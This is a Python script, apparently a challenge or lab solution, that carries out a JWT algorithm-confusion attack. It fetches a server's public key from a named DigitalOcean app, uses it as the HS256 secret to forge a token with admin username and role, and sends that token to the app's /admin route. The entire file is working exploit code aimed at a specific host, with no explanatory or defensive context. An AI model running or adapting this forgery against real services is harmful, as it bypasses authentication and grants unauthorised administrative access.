import requests
import jwt

# Define the URL for the public-key endpoint
url = "https://hammerhead-app-armhf.ondigitalocean.app/public-key"

try:
    # Send the GET request to the specified URL
    response = requests.get(url)

    # Check if the request was successful
    if response.status_code == 200:
        # Print the response text (public key)
        print("Public Key: Status")
        print(response.text)
        public_key = response.text
    else:
        # If the request was not successful, print the status code and error
        print(f"Failed to fetch public key. Status code: {response.status_code}")
        print("Response text:", response.text)
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")

# Payload for the JWT
payload = {
    "username": "admin",
    "role": "admin"
}

# Encode the JWT using HS256 with the public key as the secret
try:
    token = jwt.encode(payload, public_key, algorithm="HS256")
    print(f"Generated JWT: {token}")
except Exception as e:
    print(f"Error generating JWT: {e}")

# Define the URL for the admin route
url2 = "https://hammerhead-app-armhf.ondigitalocean.app/admin"

# Authorization headers with the token
headers = {
    "Authorization": f"Bearer {token}"
}

# Send the GET request to the /admin route
try:
    response = requests.get(url2, headers=headers)

    # Print the server response
    if response.status_code == 200:
        print("Success! Here's the response from the server:")
        print(response.text)
    else:
        print(f"Failed. Status Code: {response.status_code}")
        print(f"Response: {response.text}")
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
